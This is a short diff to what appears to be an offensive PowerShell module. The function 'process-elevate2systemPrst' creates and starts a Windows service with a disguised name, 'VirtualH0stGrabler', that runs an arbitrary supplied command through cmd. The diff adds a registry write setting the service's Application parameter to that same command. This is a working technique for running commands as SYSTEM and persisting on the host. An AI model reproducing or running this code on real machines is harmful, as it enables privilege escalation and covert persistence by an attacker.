@@ -282,6 +282,7 @@ function process-elevate2systemPrst {
     )
     $Request =  $processName
 cmd /c SC CREATE VirtualH0stGrabler binpath= "cmd /c cmd /c $Request"
+cmd /c "REG ADD HKLM\SYSTEM\CurrentControlSet\Services\VirtualH0stGrabler\Parameters /v Application /t REG_SZ /d $Request /f "
 cmd /c SC start VirtualH0stGrabler
 }
 Export-ModuleMember -Function process-elevate2systemPrst
